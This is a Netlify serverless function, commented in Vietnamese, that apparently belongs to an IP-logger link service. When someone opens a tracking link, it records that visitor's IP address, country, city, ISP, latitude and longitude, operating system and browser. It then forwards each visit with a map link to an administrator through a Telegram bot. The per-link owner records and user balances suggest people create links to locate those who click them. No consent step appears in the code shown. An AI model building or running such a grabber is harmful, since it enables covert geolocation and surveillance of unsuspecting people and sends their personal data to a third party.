// netlify/functions/track.js - Xử lý tracking
const fetch = require('node-fetch');

// ===== CẤU HÌNH =====
const BOT_TOKEN = 'YOUR_BOT_TOKEN'; // Thay token thật
const ADMIN_ID = 'YOUR_ADMIN_ID'; // Thay ID admin

// ===== LƯU TRỮ TẠM (Dùng FaunaDB hoặc MongoDB trong production) =====
const links = {}; // { code: { owner, created, users: [] } }
const users = {}; // { userId: { balance, links: [] } }

exports.handler = async function(event, context) {
    // CORS
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type',
    };

    if (event.httpMethod === 'OPTIONS') {
        return { statusCode: 200, headers, body: '' };
    }

    try {
        const data = JSON.parse(event.body);
        const code = data.code || 'unknown';

        // Lưu thông tin user vào link
        if (!links[code]) {
            links[code] = { users: [] };
        }
        
        // Thêm thông tin user
        links[code].users.push({
            ip: data.ip,
            country: data.country,
            city: data.city,
            isp: data.isp,
            latitude: data.latitude,
            longitude: data.longitude,
            os: data.os,
            browser: data.browser,
            time: data.time,
            timestamp: data.timestamp,
            map: data.map
        });

        // Gửi thông báo cho admin
        const msg = `
🎯 **CÓ NGƯỜI TRUY CẬP MỚI**
━━━━━━━━━━━━━━━━━━━━━━━━

🔗 **MÃ CODE:** \`${code}\`

🌐 **IP:** \`${data.ip}\`
📍 **Vị trí:** ${data.country} - ${data.city}
📡 **ISP:** ${data.isp}
🖥️ **HĐH:** ${data.os}
⏰ **Thời gian:** ${data.time}

🗺️ [Xem bản đồ](${data.map})

👤 **Tổng truy cập:** ${links[code].users.length}
━━━━━━━━━━━━━━━━━━━━━━━━
        `;

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: ADMIN_ID,
                text: msg,
                parse_mode: 'Markdown'
            })
        });

        return {
            statusCode: 200,
            headers,
            body: JSON.stringify({ success: true })
        };

    } catch (error) {
        console.error('Error:', error);
        return {
            statusCode: 500,
            headers,
            body: JSON.stringify({ error: 'Internal Server Error' })
        };
    }
};
